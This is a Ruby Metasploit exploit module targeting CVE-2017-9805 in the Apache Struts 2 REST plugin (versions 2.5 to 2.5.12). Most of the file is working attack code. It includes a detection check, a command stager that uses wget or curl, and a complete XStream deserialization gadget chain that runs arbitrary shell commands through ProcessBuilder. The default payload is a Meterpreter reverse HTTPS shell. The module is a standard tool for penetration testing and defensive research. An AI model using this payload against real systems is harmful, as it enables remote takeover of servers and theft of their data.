##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'                => 'Apache Struts 2 REST Plugin XStream RCE',
      'Description'         => %q{
        The REST Plugin is using a XStreamHandler with an instance of XStream
        for deserialization without any type filtering and this can lead to
        Remote Code Execution when deserializing XML payloads.
      },
      'Author'              => [
        'Man Yue Mo', # Vuln
        'caiqiiqi',   # PoC
        'wvu'         # Module
      ],
      'References'          => [
        ['CVE', '2017-9805'],
        ['URL', 'https://struts.apache.org/docs/s2-052.html'],
        ['URL', 'https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement'],
        ['URL', 'http://blog.csdn.net/caiqiiqi/article/details/77861477']
      ],
      'DisclosureDate'      => 'Sep 5 2017',
      'License'             => MSF_LICENSE,
      'Platform'            => ['unix', 'linux', 'win'],
      'Arch'                => [ARCH_CMD, ARCH_X86, ARCH_X64],
      'Privileged'          => false,
      'Targets'             => [
        ['Apache Struts 2.5 - 2.5.12', {}]
      ],
      'DefaultTarget'       => 0,
      'DefaultOptions'      => {
        'PAYLOAD'           => 'linux/x64/meterpreter_reverse_https',
        'CMDSTAGER::FLAVOR' => 'wget'
      },
      'CmdStagerFlavor'     => ['wget', 'curl']
    ))

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [true, 'Path to Struts app', '/struts2-rest-showcase/orders/3'])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => target_uri.path
    )

    if res && res.code == 200
      CheckCode::Detected
    else
      CheckCode::Safe
    end
  end

  def exploit
    execute_cmdstager
  end

  def execute_command(cmd, opts = {})
    send_request_cgi(
      'method' => 'POST',
      'uri'    => target_uri.path,
      'ctype'  => 'application/xml',
      'data'   => xml_payload(cmd)
    )
  end

  def xml_payload(cmd)
    # xmllint --format
    <<EOF
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>/bin/sh</string><string>-c</string><string>#{cmd}</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer/>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
EOF
  end

